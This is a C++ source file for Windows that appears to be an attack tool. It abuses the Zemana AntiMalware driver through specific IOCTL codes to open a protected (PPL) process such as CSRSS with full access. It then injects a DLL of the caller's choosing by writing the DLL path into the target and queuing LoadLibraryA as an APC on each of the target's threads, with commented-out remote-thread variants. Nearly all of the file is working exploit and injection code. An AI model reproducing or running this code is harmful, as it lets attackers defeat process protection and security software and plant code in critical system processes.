#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#pragma comment (lib, "ntdll.lib")
#define ERROR_MACRO(x) std::cout << "[DBG] Can't call " << x << " Reason: "<< GetLastError() <<  std::endl;

typedef NTSTATUS(NTAPI *pNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, CLIENT_ID* cl_id);
typedef NTSTATUS(NTAPI *pNtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext OPTIONAL, PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, ULONG ApcReserved OPTIONAL);

pNtOpenThread NtOpenThread = (pNtOpenThread)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtOpenThread");
pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQueueApcThread");

/*
typedef struct _CLIENT_ID
{
	UINT64 UniqueProcess;
	UINT64 UniqueThread;
}CLIENT_ID,*PCLIENT_ID;
*/

typedef NTSTATUS (NTAPI *MyRtlCreateUserThread)(
	IN HANDLE               ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN              CreateSuspended,
	IN ULONG                StackZeroBits,
	IN OUT PULONG           StackReserved,
	IN OUT PULONG           StackCommit,
	IN PVOID                StartAddress,
	IN PVOID                StartParameter OPTIONAL,
	OUT PHANDLE             ThreadHandle,
	OUT CLIENT_ID*         ClientID
);
struct NtCreateThreadExBuffer
{
	SIZE_T Size;
	SIZE_T Unknown1;
	SIZE_T Unknown2;
	PULONG Unknown3;
	SIZE_T Unknown4;
	SIZE_T Unknown5;
	SIZE_T Unknown6;
	PULONG Unknown7;
	SIZE_T Unknown8;
};
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtCreateThreadEx(PHANDLE,
	ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE, LPVOID,
	BOOL, SIZE_T, SIZE_T, SIZE_T, LPVOID);

BOOL set_privilege(LPSTR prv_name) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tempTP;
	LUID tempLUID;
	/*
		#define SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L)
		#define SE_PRIVILEGE_ENABLED            (0x00000002L)
		#define SE_PRIVILEGE_REMOVED            (0X00000004L)
		#define SE_PRIVILEGE_USED_FOR_ACCESS    (0x80000000L)
	*/

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		ERROR_MACRO("OpenProcessToken");
		return FALSE;
	}

	if (!LookupPrivilegeValueA(NULL, prv_name, &tempLUID)) {
		ERROR_MACRO("LookupPrivilesgeValueA");
		return FALSE;
	}
	tempTP.PrivilegeCount = 1; // size of array
	tempTP.Privileges->Luid = tempLUID;
	tempTP.Privileges->Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tempTP, sizeof(tempTP), NULL, NULL)) {
		ERROR_MACRO("AdjustTokenPrivileges");
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}

HANDLE GetPPLHandle(DWORD pid) {
	HANDLE hDevice, hProcess;
	DWORD myPid;
	
	hDevice = CreateFile(
		"\\\\.\\ZemanaAntiMalware",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (!hDevice)
	{
		printf("Can't not find device driver..\n");
		return 0;
	}
	// Registering my process with the driver
	myPid = GetCurrentProcessId();
	if (!DeviceIoControl(hDevice, 0x80002010, &myPid, sizeof(DWORD), NULL, 0, NULL, NULL)) {
		CloseHandle(hDevice);
		return 0;
	}
	// Using IOCTL to get full access process handle
	DeviceIoControl(hDevice, 0x8000204C, &pid, sizeof(DWORD), &hProcess, sizeof(HANDLE), NULL, NULL);
	CloseHandle(hDevice);
	return hProcess;
}

typedef HMODULE (WINAPI *MyLoadLibrary)(_In_ LPCSTR lpLibFileName);

int main(int argc, char **argv)
{
	HANDLE hTarget;
	MyLoadLibrary temp;
	MyRtlCreateUserThread temp1;
	LPVOID buffer;
	NtCreateThreadExBuffer ntbuffer;
	HANDLE hThread;
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY pmdcp;
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY pmbsp;
	HANDLE TestHandle;
	CLIENT_ID abc;

	memset(&ntbuffer, 0, sizeof(NtCreateThreadExBuffer));
    DWORD temp_dword1 = 0;
    DWORD temp_dword2 = 0;

    ntbuffer.Size = sizeof(NtCreateThreadExBuffer);
    ntbuffer.Unknown1 = 0x10003;
    ntbuffer.Unknown2 = 0x8;
    ntbuffer.Unknown3 = &temp_dword2;
    ntbuffer.Unknown4 = 0;
    ntbuffer.Unknown5 = 0x10004;
    ntbuffer.Unknown6 = 4;
    ntbuffer.Unknown7 = &temp_dword1;
    ntbuffer.Unknown8 = 0;

	set_privilege(LPSTR("SeDebugPrivilege"));
	hTarget = GetPPLHandle(atoi(argv[1]));
	std::cout << "hTarget : " << hTarget << std::endl;
	GetProcessMitigationPolicy(hTarget, ProcessDynamicCodePolicy, (PVOID)&pmdcp, sizeof(pmdcp));
	GetProcessMitigationPolicy(hTarget, ProcessSignaturePolicy, (PVOID)&pmbsp, sizeof(pmbsp));

	/* CSRSS Mitigation Checker */
	std::cout << "-------- CSRSS ProcessDynamicCodePolicy --------" << std::endl;
	std::cout << "AllowRemoteDowngrade : " << pmdcp.AllowRemoteDowngrade << std::endl;
	std::cout << "AllowThreadOptOut : " << pmdcp.AllowThreadOptOut << std::endl;
	std::cout << "AuditProhibitDynamicCode : " << pmdcp.AuditProhibitDynamicCode << std::endl;
	std::cout << "ProhibitDynamicCode : " << pmdcp.ProhibitDynamicCode << std::endl;
	std::cout << "-------- CSRSS ProcessSignaturePolicy --------" << std::endl;
	std::cout << "AuditMicrosoftSignedOnly : " << pmbsp.AuditMicrosoftSignedOnly << std::endl;
	std::cout << "AuditStoreSignedOnly : " << pmbsp.AuditStoreSignedOnly << std::endl;
	std::cout << "MicrosoftSignedOnly : " << pmbsp.MicrosoftSignedOnly << std::endl;
	std::cout << "MitigationOptIn : " << pmbsp.MitigationOptIn << std::endl;
	std::cout << "StoreSignedOnly : " << pmbsp.StoreSignedOnly << std::endl;
	GetProcessMitigationPolicy(GetCurrentProcess(), ProcessDynamicCodePolicy, (PVOID)&pmdcp, sizeof(pmdcp));
	GetProcessMitigationPolicy(GetCurrentProcess(), ProcessSignaturePolicy, (PVOID)&pmbsp, sizeof(pmbsp));
	/* MyProcess Mitigation Checker */
	std::cout << "-------- MyProcessDynamicCodePolicy --------" << std::endl;
	std::cout << "AllowRemoteDowngrade : " << pmdcp.AllowRemoteDowngrade << std::endl;
	std::cout << "AllowThreadOptOut : " << pmdcp.AllowThreadOptOut << std::endl;
	std::cout << "AuditProhibitDynamicCode : " << pmdcp.AuditProhibitDynamicCode << std::endl;
	std::cout << "ProhibitDynamicCode : " << pmdcp.ProhibitDynamicCode << std::endl;
	std::cout << "-------- MyProcessSignaturePolicy --------" << std::endl;
	std::cout << "AudiTMicrosoftSignedOnly : " << pmbsp.AuditMicrosoftSignedOnly << std::endl;
	std::cout << "AuditStoreSignedOnly : " << pmbsp.AuditStoreSignedOnly << std::endl;
	std::cout << "MicrosoftSignedOnly : " << pmbsp.MicrosoftSignedOnly << std::endl;
	std::cout << "MitigationOptIn : " << pmbsp.MitigationOptIn << std::endl;
	std::cout << "StoreSignedOnly : " << pmbsp.StoreSignedOnly << std::endl;

	temp = (MyLoadLibrary)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"); 
	std::cout << " LoadLibrary : " << temp << std::endl;
	buffer = VirtualAllocEx(hTarget, NULL, strlen(argv[2])+1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!WriteProcessMemory(hTarget, buffer, argv[2], strlen(argv[2]) + 1, NULL)) {
		ERROR_MACRO("WriteProcessMemory");
	}
	std::cout << "end?" << std::endl;
	temp1 = (MyRtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread");
	std::cout << "RtlCreateUserThread Address: " << temp1 << std::endl;

	HANDLE hTool;
	THREADENTRY32 te;

	hTool = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	te.dwSize = sizeof(THREADENTRY32);
	Thread32First(hTool, &te);
	do {
		if (te.th32OwnerProcessID == GetProcessId(hTarget)) {
			std::cout << "[STATUS] Found Thread : " <<  te.th32OwnerProcessID << std::endl;
			CLIENT_ID cid;
			OBJECT_ATTRIBUTES ObjectAttributes;
			cid.UniqueProcess = (HANDLE)te.th32OwnerProcessID;
			cid.UniqueThread = (HANDLE)te.th32ThreadID;
			std::cout << "[STATUS] cid.UniqueProcess : " << cid.UniqueProcess << std::endl;
			std::cout << "[STATUS] cid.UniqueTHread : " << cid.UniqueThread << std::endl;
			InitializeObjectAttributes(&ObjectAttributes, NULL, NULL, NULL, NULL);
			std::cout << "[STATUS] Found Thread " << std::endl;
			hThread = OpenThread(GENERIC_ALL, 0, (DWORD)cid.UniqueThread);
			std::cout << "hThread : " << hThread << std::endl;
			/*
			if (!NtOpenThread(&hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &cid)) {
				ERROR_MACRO("NtOpenThread failed.");
			}
			*/

			if (hThread) {
				std::cout << "Thread Opend!" << std::endl;
				SuspendThread(hThread);
				auto ret = NtQueueApcThread(hThread,
					(PIO_APC_ROUTINE)temp, buffer, NULL, NULL);
				printf_s("Ret 0x%p\nError 0x%p\n", ret, GetLastError());
				DWORD ret1 = QueueUserAPC((PAPCFUNC)temp, hThread, (ULONG_PTR)buffer);
				printf_s("Ret 0x%p\nError 0x%p\n", ret1, GetLastError());
				ResumeThread(hThread);
				CloseHandle(hThread);
			}
		}
	} while (Thread32Next(hTool, &te));
	std::cout << "NtQueueApcThread ended.." << std::endl;

	/*
	NTSTATUS status = NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hTarget,
		(LPTHREAD_START_ROUTINE)temp, buffer,
		FALSE, NULL, NULL, NULL, &ntbuffer);

	if (!status)
	{
		ERROR_MACRO("NtCreateThreadEx");
	}

	if (!temp1(hTarget, NULL, FALSE, 0, 0, 0, temp, buffer, &TestHandle, &abc))
	{
		ERROR_MACRO("RtlCreateUserThread");
	}

	if (!CreateRemoteThread(
		hTarget,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)temp,
		buffer,
		0,
		NULL
	)){
		ERROR_MACRO("CreateRemoteThread");
	}
	*/
	std::cout << "end?" << std::endl;

	// VirtualAllocEx
	// GetModuelHandle
	// GetProcAddress
	// LoadLibrary
	// CreatRemoteThread

	//WriteProcessMemory(hTarget, )

	
	// TODO: 대상 프로그램에 WriteProcssMemory로 dll의 경로와 loadlibrary의 주소를 넣어줘야함.
	// VirtualAlloc
	//WriteProcessMemory()
	// CreateRemoteThread()

	return 0;
}